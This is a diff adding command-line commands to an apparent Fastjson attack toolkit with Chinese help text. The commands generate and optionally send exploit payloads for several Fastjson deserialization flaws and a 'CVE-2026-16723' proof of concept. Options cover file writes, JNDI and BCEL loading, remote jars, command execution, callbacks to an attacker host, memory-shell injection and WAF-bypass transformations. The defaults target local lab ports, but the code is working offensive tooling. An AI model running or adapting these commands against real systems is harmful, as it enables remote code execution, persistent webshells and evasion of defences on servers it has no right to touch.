@@ -32,6 +32,20 @@ def _parse_headers(header: Optional[list[str]]) -> dict[str, str]:
     return headers
 
 
+def _waf_cli_options(
+    waf: Optional[list[str]],
+    pad_size: int,
+    comma_count: int,
+):
+    from fastjson_toolkit.waf import WafOptions
+
+    techs = [t.strip() for t in (waf or []) if t and t.strip()]
+    opts = None
+    if techs:
+        opts = WafOptions(pad_size=pad_size, comma_count=comma_count)
+    return techs, opts
+
+
 @app.command("detect")
 def detect_cmd(
     target: str = typer.Argument(..., help="目标 URL，例如 http://127.0.0.1:18080/api/fastjson"),
@@ -290,6 +304,544 @@ def deps_cmd(
             rprint(f"  {i}. {action}")
 
     raise typer.Exit(0 if result.present_count else 1)
+
+
+@app.command("expect")
+def expect_cmd(
+    target: str = typer.Argument(..., help="目标 URL（反序列化点）"),
+    base_body: Optional[str] = typer.Option(
+        None,
+        "--base-body",
+        help='原始请求 JSON；默认 {"age":20,"name":"Bob"}',
+    ),
+    timeout: float = typer.Option(10.0, "--timeout"),
+    header: Optional[list[str]] = typer.Option(None, "--header", "-H"),
+    proxy: Optional[str] = typer.Option(None, "--proxy"),
+    insecure: bool = typer.Option(False, "--insecure"),
+    json_out: bool = typer.Option(False, "--json"),
+) -> None:
+    """探测反序列化点是否存在期望类（expectClass）。"""
+    from fastjson_toolkit.expect import FastjsonExpectClassDetector
+
+    load_dotenv()
+    headers = _parse_headers(header)
+    detector = FastjsonExpectClassDetector(
+        timeout=timeout,
+        headers=headers or None,
+        proxy=proxy,
+        verify_tls=not insecure,
+    )
+    try:
+        result = detector.detect(target, base_body=base_body)
+    finally:
+        detector.close()
+
+    if json_out:
+        typer.echo(result.model_dump_json(indent=2))
+        raise typer.Exit(0 if result.has_expect_class is not None else 1)
+
+    color = "green" if result.has_expect_class else ("yellow" if result.has_expect_class is False else "red")
+    rprint(Panel(result.summary, title="期望类探测结果", border_style=color))
+    for note in result.notes:
+        rprint(f"[dim]{note}[/dim]")
+
+    table = Table(title="探针证据")
+    table.add_column("Probe")
+    table.add_column("Errored")
+    table.add_column("Status")
+    table.add_column("Interpretation")
+    for ev in result.evidence:
+        table.add_row(
+            ev.probe_id,
+            "-" if ev.errored is None else ("yes" if ev.errored else "no"),
+            str(ev.status_code),
+            ev.interpretation or "-",
+        )
+    rprint(table)
+
+    if result.next_actions:
+        rprint("[bold]下一步建议[/bold]")
+        for i, action in enumerate(result.next_actions, 1):
+            rprint(f"  {i}. {action}")
+
+    raise typer.Exit(0 if result.has_expect_class is True else 1)
+
+
+@app.command("poc-1280")
+def poc_1280_cmd(
+    gadget: str = typer.Option(
+        "jackson_cache",
+        "--gadget",
+        "-g",
+        help="见 --list；如 jackson_cache / io_write / groovy / postgresql",
+    ),
+    file: Optional[str] = typer.Option(None, "--file", "-f", help="写入/读取路径"),
+    content: Optional[str] = typer.Option(None, "--content", "-c", help="写入内容"),
+    url: Optional[str] = typer.Option(None, "--read-url", help="io_read_error URL"),
+    guess_byte: Optional[int] = typer.Option(None, "--guess-byte", help="报错读首字节"),
+    host: Optional[str] = typer.Option(None, "--host", help="MySQL/PG host"),
+    port: Optional[int] = typer.Option(None, "--port", help="MySQL/PG port"),
+    socket_factory_arg: Optional[str] = typer.Option(
+        None, "--socket-factory-arg", help="postgresql/jython ClassPathXml URL"
+    ),
+    classpath: Optional[str] = typer.Option(
+        None, "--classpath", help="groovy classpathList jar URL"
+    ),
+    wrap_currency: bool = typer.Option(
+        False,
+        "--wrap-currency",
+        help="对每步套 Currency 触发 getter（业务点有期望类时）",
+    ),
+    currency_field: str = typer.Option(
+        "currency",
+        "--currency-field",
+        help="Currency MiscCodec 字段：currency 或 currencyCode",
+    ),
+    target: str = typer.Option(
+        "http://127.0.0.1:18180/api/fastjson",
+        "--url",
+        "-u",
+        help="发送目标（配合 --send）",
+    ),
+    send: bool = typer.Option(False, "--send", help="按步骤 POST payload 到目标"),
+    reset_cache: bool = typer.Option(
+        False, "--reset-cache", help="发送前调用靶场 /api/reset"
+    ),
+    waf: Optional[list[str]] = typer.Option(
+        None, "--waf", help="WAF 变换 id，可重复；见 fjtoolkit waf --list"
+    ),
+    pad_size: int = typer.Option(20000, "--pad-size", help="WAF pad 填充长度"),
+    comma_count: int = typer.Option(5, "--comma-count", help="WAF 多逗号数量"),
+    list_gadgets: bool = typer.Option(False, "--list", help="列出 gadget"),
+    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
+) -> None:
+    """Fastjson ≤1.2.80 Exception 缓存：生成 / 可选按步发送证明 payload。"""
+    from fastjson_toolkit.poc import (
+        Poc1280SendOptions,
+        list_poc_1280_gadgets,
+        run_poc_1280,
+    )
+
+    if list_gadgets:
+        gadgets = list_poc_1280_gadgets()
+        if json_out:
+            typer.echo(json.dumps(gadgets, ensure_ascii=False, indent=2))
+        else:
+            for g in gadgets:
+                rprint(f"[bold]{g['id']}[/bold]  {g['title']}  ({g['steps']} 步)")
+                rprint(f"  {g['description']}")
+                rprint(f"  requires: {', '.join(g['requires'])} | jdk: {g['jdk']}")
+        raise typer.Exit(0)
+
+    waf_techs, waf_opts = _waf_cli_options(waf, pad_size, comma_count)
+    opts = Poc1280SendOptions(
+        gadget=gadget,
+        file=file,
+        content=content,
+        url=url,
+        guess_byte=guess_byte,
+        host=host,
+        port=port,
+        socket_factory_arg=socket_factory_arg,
+        classpath=classpath,
+        wrap_currency=wrap_currency,
+        currency_field=currency_field,
+        waf_techniques=waf_techs,
+        waf_options=waf_opts,
+        target=target,
+        send=send,
+        reset_cache=reset_cache,
+    )
+    try:
+        result = run_poc_1280(opts)
+    except (KeyError, ValueError) as exc:
+        rprint(f"[red]{exc}[/red]")
+        raise typer.Exit(2) from exc
+
+    if json_out:
+        typer.echo(result.model_dump_json(indent=2))
+    else:
+        rprint(Panel(result.summary, title=f"1.2.80 / {result.gadget}", border_style="cyan"))
+        if result.steps:
+            for i, step in enumerate(result.steps, 1):
+                rprint(f"[dim]--- step {i}/{len(result.steps)} ---[/dim]")
+                rprint(step[:1500] + ("..." if len(step) > 1500 else ""))
+        if result.sent and result.status_codes:
+            rprint(f"[dim]HTTP {result.status_codes}[/dim]")
+            if result.response_preview:
+                rprint(result.response_preview[:500])
+    raise typer.Exit(0 if result.ok else 1)
+
+
+@app.command("poc-1268")
+def poc_1268_cmd(
+    gadget: str = typer.Option(
+        "file_truncate",
+        "--gadget",
+        "-g",
+        help="见 --list；如 file_truncate / jdk11_write / io1_write / io_final",
+    ),
+    file: Optional[str] = typer.Option(None, "--file", "-f", help="写入/截断路径"),
+    content: Optional[str] = typer.Option(None, "--content", "-c", help="写入内容"),
+    source: Optional[str] = typer.Option(None, "--source", help="file_copy 源路径"),
+    url: Optional[str] = typer.Option(None, "--read-url", help="io_read_* URL"),
+    guess_byte: Optional[int] = typer.Option(None, "--guess-byte", help="报错读首字节"),
+    host: Optional[str] = typer.Option(None, "--host", help="MySQL/PG host"),
+    port: Optional[int] = typer.Option(None, "--port", help="MySQL/PG port"),
+    jdbc_url: Optional[str] = typer.Option(None, "--jdbc-url", help="mysql_jdbc_60 URL"),
+    socket_factory_arg: Optional[str] = typer.Option(
+        None, "--socket-factory-arg", help="postgresql ClassPathXml URL"
+    ),
+    wrap_currency: bool = typer.Option(
+        False,
+        "--wrap-currency",
+        help="套 Currency 触发 getter（业务点有期望类时）",
+    ),
+    currency_field: str = typer.Option(
+        "currency",
+        "--currency-field",
+        help="Currency MiscCodec 字段：currency 或 currencyCode",
+    ),
+    target: str = typer.Option(
+        "http://127.0.0.1:18168/api/fastjson",
+        "--url",
+        "-u",
+        help="发送目标（配合 --send）",
+    ),
+    send: bool = typer.Option(False, "--send", help="POST payload 到目标"),
+    waf: Optional[list[str]] = typer.Option(
+        None, "--waf", help="WAF 变换 id，可重复；见 fjtoolkit waf --list"
+    ),
+    pad_size: int = typer.Option(20000, "--pad-size", help="WAF pad 填充长度"),
+    comma_count: int = typer.Option(5, "--comma-count", help="WAF 多逗号数量"),
+    list_gadgets: bool = typer.Option(False, "--list", help="列出 gadget"),
+    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
+) -> None:
+    """Fastjson ≤1.2.68 AutoCloseable：生成 / 可选发送证明 payload。"""
+    from fastjson_toolkit.poc import (
+        Poc1268SendOptions,
+        list_poc_1268_gadgets,
+        run_poc_1268,
+    )
+
+    if list_gadgets:
+        gadgets = list_poc_1268_gadgets()
+        if json_out:
+            typer.echo(json.dumps(gadgets, ensure_ascii=False, indent=2))
+        else:
+            for g in gadgets:
+                rprint(f"[bold]{g['id']}[/bold]  {g['title']}")
+                rprint(f"  {g['description']}")
+                rprint(f"  requires: {', '.join(g['requires'])} | jdk: {g['jdk']}")
+        raise typer.Exit(0)
+
+    waf_techs, waf_opts = _waf_cli_options(waf, pad_size, comma_count)
+    opts = Poc1268SendOptions(
+        gadget=gadget,
+        file=file,
+        content=content,
+        source=source,
+        url=url,
+        guess_byte=guess_byte,
+        host=host,
+        port=port,
+        jdbc_url=jdbc_url,
+        socket_factory_arg=socket_factory_arg,
+        wrap_currency=wrap_currency,
+        currency_field=currency_field,
+        waf_techniques=waf_techs,
+        waf_options=waf_opts,
+        target=target,
+        send=send,
+    )
+    try:
+        result = run_poc_1268(opts)
+    except (KeyError, ValueError) as exc:
+        rprint(f"[red]{exc}[/red]")
+        raise typer.Exit(2) from exc
+
+    if json_out:
+        typer.echo(result.model_dump_json(indent=2))
+    else:
+        rprint(Panel(result.summary, title=f"1.2.68 / {result.gadget}", border_style="cyan"))
+        rprint(result.payload[:2000] + ("..." if len(result.payload) > 2000 else ""))
+        if result.sent and result.status_code is not None:
+            rprint(f"[dim]HTTP {result.status_code}[/dim]")
+            if result.response_preview:
+                rprint(result.response_preview[:500])
+    raise typer.Exit(0 if result.ok else 1)
+
+
+@app.command("poc-1247")
+def poc_1247_cmd(
+    gadget: str = typer.Option(
+        "jdbc_rowset",
+        "--gadget",
+        "-g",
+        help=(
+            "jdbc_rowset / bcel_tomcat_dbcp / bcel_tomcat_dbcp2 / "
+            "bcel_commons_dbcp / bcel_commons_dbcp2 / c3p0_wrapper / "
+            "mybatis_bcel / h2_jdbc"
+        ),
+    ),
+    jndi_url: str = typer.Option(
+        "ldap://127.0.0.1:1389/Exploit",
+        "--jndi",
+        help="JdbcRowSetImpl dataSourceName",
+    ),
+    bcel_code: Optional[str] = typer.Option(None, "--bcel", help="$$BCEL$$..."),
+    class_b64: Optional[str] = typer.Option(None, "--class-b64", help=".class Base64"),
+    user_overrides: Optional[str] = typer.Option(
+        None, "--user-overrides", help="C3P0 HexAsciiSerializedMap"
+    ),
+    serialized_b64: Optional[str] = typer.Option(
+        None, "--serialized-b64", help="二次反序列化 gadget Base64"
+    ),
+    h2_url: Optional[str] = typer.Option(None, "--h2-url", help="完整 H2 JDBC URL"),
+    getter_trigger: str = typer.Option(
+        "ref",
+        "--getter-trigger",
+        "-t",
+        help="ref / json_key / currency / currency_json_key（有期望类用 currency*）",
+    ),
+    currency_field: str = typer.Option(
+        "currency",
+        "--currency-field",
+        help="Currency MiscCodec 字段：currency 或 currencyCode",
+    ),
+    json_key_no_type: bool = typer.Option(
+        False,
+        "--json-key-no-type",
+        help="json_key 省略 @type=JSONObject（{} 默认为 JSONObject）",
+    ),
+    json_key_as_array: bool = typer.Option(
+        False,
+        "--json-key-array",
+        help="json_key 用 JSONArray 作 key：[{...}]:{}",
+    ),
+    target: str = typer.Option(
+        "http://127.0.0.1:18047/api/fastjson",
+        "--url",
+        "-u",
+        help="发送目标（配合 --send）",
+    ),
+    send: bool = typer.Option(False, "--send", help="POST payload 到目标"),
+    waf: Optional[list[str]] = typer.Option(
+        None, "--waf", help="WAF 变换 id，可重复；见 fjtoolkit waf --list"
+    ),
+    pad_size: int = typer.Option(20000, "--pad-size", help="WAF pad 填充长度"),
+    comma_count: int = typer.Option(5, "--comma-count", help="WAF 多逗号数量"),
+    list_gadgets: bool = typer.Option(False, "--list", help="列出 gadget"),
+    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
+) -> None:
+    """Fastjson ≤1.2.47 缓存绕过：生成 / 可选发送证明 payload。"""
+    from fastjson_toolkit.poc import (
+        Poc1247SendOptions,
+        list_poc_1247_gadgets,
+        run_poc_1247,
+    )
+
+    if list_gadgets:
+        gadgets = list_poc_1247_gadgets()
+        if json_out:
+            typer.echo(json.dumps(gadgets, ensure_ascii=False, indent=2))
+        else:
+            for g in gadgets:
+                rprint(f"[bold]{g['id']}[/bold]  {g['title']}")
+                rprint(f"  {g['description']}")
+                rprint(f"  requires: {', '.join(g['requires'])} | jdk: {g['jdk']}")
+        raise typer.Exit(0)
+
+    waf_techs, waf_opts = _waf_cli_options(waf, pad_size, comma_count)
+    opts = Poc1247SendOptions(
+        gadget=gadget,
+        jndi_url=jndi_url,
+        bcel_code=bcel_code,
+        class_b64=class_b64,
+        user_overrides=user_overrides,
+        serialized_b64=serialized_b64,
+        h2_url=h2_url,
+        getter_trigger=getter_trigger,
+        currency_field=currency_field,
+        json_key_with_type=not json_key_no_type,
+        json_key_as_array=json_key_as_array,
+        waf_techniques=waf_techs,
+        waf_options=waf_opts,
+        target=target,
+        send=send,
+    )
+    try:
+        result = run_poc_1247(opts)
+    except (KeyError, ValueError) as exc:
+        rprint(f"[red]{exc}[/red]")
+        raise typer.Exit(2) from exc
+
+    if json_out:
+        typer.echo(result.model_dump_json(indent=2))
+    else:
+        rprint(Panel(result.summary, title=f"1.2.47 / {result.gadget}", border_style="cyan"))
+        rprint(result.payload)
+        if result.sent and result.status_code is not None:
+            rprint(f"[dim]HTTP {result.status_code}[/dim]")
+            if result.response_preview:
+                rprint(result.response_preview[:500])
+    raise typer.Exit(0 if result.ok else 1)
+
+
+@app.command("poc-16723")
+def poc_16723_cmd(
+    target: str = typer.Option(
+        "http://127.0.0.1:18083",
+        "--url",
+        "-u",
+        help="目标基址（默认 Undertow 靶场 18083）",
+    ),
+    mode: str = typer.Option(
+        "http",
+        "--mode",
+        "-m",
+        help="http=jar:http 出网；fd=fd-cache 不出网",
+    ),
+    host: str = typer.Option(
+        "attacker",
+        "--host",
+        "-H",
+        help="攻击者 HTTP 主机（靶场视角）；IPv4 自动转十进制",
+    ),
+    port: int = typer.Option(9192, "--port", "-P", help="攻击者 HTTP 端口"),
+    cmd: str = typer.Option("id", "--cmd", "-c", help="执行/回显验证命令"),
+    echo: bool = typer.Option(False, "--echo", "-e", help="回显模式"),
+    engine: str = typer.Option("auto", "--engine", help="auto/spring/undertow/tomcat"),
+    json_path: str = typer.Option("/json", "--json-path", help="反序列化路径"),
+    docker_container: str = typer.Option(
+        "cve-2026-16723-undertow",
+        "--docker-container",
+        help="读证明文件的 docker 容器名；传空禁用",
+    ),
+    reuse_type: Optional[str] = typer.Option(None, "--type", "-t", help="复用已命中 @type"),
+    memshell: bool = typer.Option(False, "--memshell", help="注入内存马（需 MemShellParty）"),
+    ms_api: str = typer.Option("http://127.0.0.1:8091", "--ms-api"),
+    ms_server: str = typer.Option("Undertow", "--ms-server"),
+    ms_tool: str = typer.Option("Command", "--ms-tool"),
+    ms_type: str = typer.Option("Filter", "--ms-type"),
+    ms_path: str = typer.Option("/*", "--ms-path"),
+    ms_jdk: str = typer.Option("8", "--ms-jdk"),
+    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
+) -> None:
+    """CVE-2026-16723（Fastjson 1.2.83）证明 PoC：jar:http / fd-cache。"""
+    from fastjson_toolkit.poc import Poc16723Options, run_cve_2026_16723
+
+    mode_norm = mode.strip().lower()
+    if mode_norm not in ("http", "fd"):
+        raise typer.BadParameter("mode 仅支持 http 或 fd")
+    engine_norm = engine.strip().lower()
+    if engine_norm not in ("auto", "spring", "undertow", "tomcat"):
+        raise typer.BadParameter("engine 仅支持 auto/spring/undertow/tomcat")
+
+    # CLI 默认跟原脚本一致：不带 -e 时走写文件/命令；Web/API 默认 echo=True
+    opts = Poc16723Options(
+        target=target,
+        mode=mode_norm,  # type: ignore[arg-type]
+        host=host,
+        port=port,
+        cmd=cmd,
+        echo=echo,
+        engine=engine_norm,  # type: ignore[arg-type]
+        json_path=json_path,
+        docker_container=docker_container,
+        reuse_type=reuse_type,
+        memshell=memshell,
+        ms_api=ms_api,
+        ms_server=ms_server,
+        ms_tool=ms_tool,
+        ms_type=ms_type,
+        ms_path=ms_path,
+        ms_jdk=ms_jdk,
+    )
+    result = run_cve_2026_16723(opts)
+    if json_out:
+        typer.echo(result.model_dump_json(indent=2))
+    else:
+        color = "green" if result.ok else "red"
+        rprint(Panel(result.summary, title="CVE-2026-16723", border_style=color))
+        for note in result.notes:
+            rprint(f"[dim]{note}[/dim]")
+    raise typer.Exit(0 if result.ok else result.exit_code)
+
+
+@app.command("waf")
+def waf_cmd(
+    payload: Optional[str] = typer.Argument(
+        None,
+        help="原始 JSON payload；也可配合 --file / stdin",
+    ),
+    file: Optional[str] = typer.Option(None, "--file", "-f", help="从文件读取 payload"),
+    technique: Optional[list[str]] = typer.Option(
+        None,
+        "--technique",
+        "-t",
+        help="变换 id，可重复；默认生成全部单项变体",
+    ),
+    mode: str = typer.Option(
+        "variants",
+        "--mode",
+        help="variants=各单项变体；stack=按 -t 顺序叠加",
+    ),
+    list_tech: bool = typer.Option(False, "--list", help="列出可用变换后退出"),
+    pad_size: int = typer.Option(20000, "--pad-size", help="pad 填充长度"),
+    comma_count: int = typer.Option(5, "--comma-count", help="多逗号数量"),
+    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
+) -> None:
+    """对 Fastjson payload 做 WAF 绕过变换（本地生成，不发包）。"""
+    from fastjson_toolkit.waf import WafOptions, WafRequest, list_techniques, run_waf
+
+    if list_tech:
+        table = Table(title="WAF 绕过变换")
+        table.add_column("ID")
+        table.add_column("Title")
+        table.add_column("Description")
+        for t in list_techniques():
+            table.add_row(t.id, t.title, t.description)
+        rprint(table)
+        raise typer.Exit(0)
+
+    raw = payload
+    if file:
+        from pathlib import Path
+
+        raw = Path(file).read_text(encoding="utf-8")
+    if raw is None:
+        import sys
+
+        if not sys.stdin.isatty():
+            raw = sys.stdin.read()
+    if not raw or not str(raw).strip():
+        raise typer.BadParameter("请提供 payload 参数、--file 或 stdin")
+
+    req = WafRequest(
+        payload=str(raw).strip(),
+        techniques=list(technique or []),
+        mode=mode,
+        options=WafOptions(pad_size=pad_size, comma_count=comma_count),
+    )
+    try:
+        result = run_waf(req)
+    except ValueError as exc:
+        raise typer.BadParameter(str(exc)) from exc
+
+    if json_out:
+        typer.echo(result.model_dump_json(indent=2))
+        raise typer.Exit(0)
+
+    rprint(Panel(result.summary, title="WAF 绕过", border_style="cyan"))
+    if mode == "stack" or (technique and mode == "stack"):
+        rprint(result.payload)
+    else:
+        for v in result.variants:
+            rprint(Panel(v.payload, title=f"{v.technique} — {v.title}", border_style="blue"))
+    for note in result.notes:
+        rprint(f"[dim]{note}[/dim]")
+    raise typer.Exit(0)
 
 
 @app.command("serve")
